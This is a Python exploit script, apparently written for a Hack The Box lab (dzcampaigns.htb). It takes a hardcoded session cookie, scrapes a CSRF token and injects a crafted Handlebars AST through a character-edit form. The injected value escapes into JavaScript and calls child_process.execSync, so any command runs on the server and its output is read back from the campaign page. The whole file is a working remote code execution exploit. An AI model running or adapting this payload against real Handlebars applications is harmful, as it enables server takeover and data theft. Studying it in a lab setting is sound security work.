#!/usr/bin/env python3

import requests
import re
import sys
import html
from urllib.parse import urljoin

# ── Configuration ────────────────────────────────────────────────
TARGET       = "http://dzcampaigns.htb"
CHARACTER_ID = 16 # change the campaign id accordingly
CAMPAIGN_ID  = 1
SESSION_COOKIE_VALUE = "s%3AYtMz1UBsVFSXd9Y5ltz3njSaTAz9eFPM.nHazLkaDxoyTn1X1EryVq7lNgBaTLSObE49PiVN5RIw" # change the session cookie
COOKIE_NAME = "dz.sid"
# ─────────────────────────────────────────────────────────────────

def build_ast_payload(command: str) -> dict:
    # Wrap command output in unique delimiters for easy extraction
    payload_cmd = f"echo '===START==='; {command}; echo '===END==='"
    
    # Escape backslashes and double quotes for safe embedding in JS string literal
    safe_cmd = payload_cmd.replace('\\', '\\\\').replace('"', '\\"')

    # Escape literal curly braces {{ }} for Python's .format()
    payload_value = (
        '{{}},{{}})) + '
        'global.process.mainModule.require(\'child_process\')'
        '.execSync("{} 2>&1; true").toString() //'
    ).format(safe_cmd)

    # Minimal AST structure matching Handlebars.parse() output exactly
    return {
        "type": "Program",
        "body": [
            {
                "type": "MustacheStatement",
                "path": {
                    "type": "PathExpression",
                    "parts": ["lookup"],
                    "depth": 0,
                    "original": "lookup"
                },
                "params": [
                    {
                        "type": "PathExpression",
                        "parts": ["this"],
                        "depth": 0,
                        "original": "this"
                    },
                    {
                        "type": "NumberLiteral",
                        "value": payload_value,
                        "original": 1
                    }
                ],
                "escaped": True
            }
        ]
    }


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} '<command>'")
        sys.exit(0)

    command = sys.argv[1]
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "http://dzcampaigns.htb",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cookie": f"{COOKIE_NAME}={SESSION_COOKIE_VALUE}"
    })

    # ── Step 1: Scrape CSRF token ────────────────────────────────
    edit_url = urljoin(TARGET, f"/character/{CHARACTER_ID}/edit")
    print(f"[*] Fetching CSRF token from {edit_url}")

    resp = session.get(edit_url, allow_redirects=True)
    if resp.status_code != 200:
        print(f"[-] Edit page returned HTTP {resp.status_code}")
        sys.exit(1)

    csrf_match = re.search(r'name=["\']_csrf["\']\s+value=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
    if not csrf_match:
        print("[-] Could not extract CSRF token.")
        sys.exit(1)

    csrf_token = csrf_match.group(1)
    print(f"[+] CSRF token: {csrf_token}")

    # ── Step 2: Inject the AST payload as JSON ───────────────────
    post_url = urljoin(TARGET, f"/character/{CHARACTER_ID}")
    print(f"[*] Injecting JSON payload to {post_url}")

    ast_payload = build_ast_payload(command)

    json_body = {
        "_csrf": csrf_token,
        "name": "Prakhar",
        "race": "Human",
        "class": "Pandits",
        "backstory": "Came from india",
        "campaign_id": CAMPAIGN_ID,
        "campaign_message": ast_payload
    }

    headers = {
        "Referer": edit_url,
        "X-CSRF-Token": csrf_token
    }

    resp = session.post(post_url, json=json_body, headers=headers, allow_redirects=True)

    if resp.status_code not in (200, 302):
        print(f"[-] Injection failed — HTTP {resp.status_code}")
        print(f"    Body: {resp.text[:500]}")
        sys.exit(1)

    print(f"[+] Payload injected (HTTP {resp.status_code})")

    # ── Step 3: Trigger compilation & read output ────────────────
    campaign_url = urljoin(TARGET, f"/campaign/{CAMPAIGN_ID}")
    print(f"[*] Triggering Handlebars render at {campaign_url}\n")

    resp = session.get(campaign_url, allow_redirects=True)
    if resp.status_code != 200:
        print(f"[-] Campaign page returned HTTP {resp.status_code}")
        sys.exit(1)

    # Unescape HTML entities (e.g. &#x3D; -> =) before applying regex
    unescaped_text = html.unescape(resp.text)

    # Extract ALL outputs using our unique delimiters
    matches = re.findall(r'===START===(.*?)===END===', unescaped_text, re.DOTALL)
    
    print("=" * 60)
    if matches:
        # Print only the last match (the most recent command execution)
        print(matches[-1].strip())
    else:
        print("[-] Delimiters not found. Full HTML response:")
        print(resp.text)
    print("=" * 60)

if __name__ == "__main__":
    main()
